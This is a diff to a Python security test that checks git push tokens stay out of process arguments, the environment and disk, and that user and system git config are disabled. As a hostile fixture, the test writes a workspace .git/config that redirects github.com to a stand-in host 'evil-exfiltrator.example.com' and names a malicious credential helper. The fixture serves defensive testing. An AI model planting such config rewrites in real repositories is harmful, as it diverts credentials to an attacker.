@@ -600,6 +600,15 @@ def test_push_token_delivery_via_anonymous_pipe_absent_from_argv_and_child_env(g
     for k, v in push_env.items():
         assert secret not in k and secret not in str(v), f"CRITICAL: Secret token leaked into environment var {k}"
     assert "GIT_CONFIG_COUNT" not in push_env
+    assert push_env.get("GIT_CONFIG_NOSYSTEM") == "1"
+    assert push_env.get("GIT_CONFIG_GLOBAL") in ("NUL", "/dev/null")
+    assert push_env.get("GIT_CONFIG_SYSTEM") in ("NUL", "/dev/null")
+
+    # Helper command specifies absolute interpreter path
+    helper_args = [a for a in cmd if "credential.helper=" in a]
+    assert len(helper_args) == 1
+    abs_python = sys.executable.replace("\\", "/")
+    assert abs_python in helper_args[0], f"Credential helper must be spawned by absolute interpreter path: {helper_args[0]}" 
 
     # 3. Live process inspection via NtQueryInformationProcess
     # Verify directly against Windows NT PEB that a child reading the pipe does NOT have the secret in CommandLine or Env
@@ -675,12 +684,17 @@ def test_push_token_delivery_via_anonymous_pipe_absent_from_argv_and_child_env(g
             except OSError:
                 pass
 
-    # 4. Workspace config rewrites receive nothing
-    # Even if an attacker wrote a malicious credential helper into workspace .git/config,
-    # supervisor pushes with GIT_CONFIG=NUL from external storage_root.
+    # 4. Hostile ~/.gitconfig and workspace .git/config rewrites receive nothing
+    # Even if an attacker wrote a malicious credential helper or URL insteadOf rewrite into workspace .git/config
+    # or user/system gitconfig, supervisor pushes with GIT_CONFIG_NOSYSTEM=1, GIT_CONFIG_GLOBAL=NUL,
+    # GIT_CONFIG_SYSTEM=NUL from external storage_root with explicit hardened flags.
     ws_config = ws / ".git" / "config"
     if ws_config.is_file():
-        ws_config.write_text("[credential]\n    helper = evil\n", encoding="utf-8")
+        ws_config.write_text(
+            "[url \"https://evil-exfiltrator.example.com/\"]\n    insteadOf = https://github.com/\n"
+            "[credential]\n    helper = evil_helper_exfiltrate\n",
+            encoding="utf-8"
+        )
 
     # 5. Token is NEVER written to disk
     for root, dirs, files in os.walk(ws):
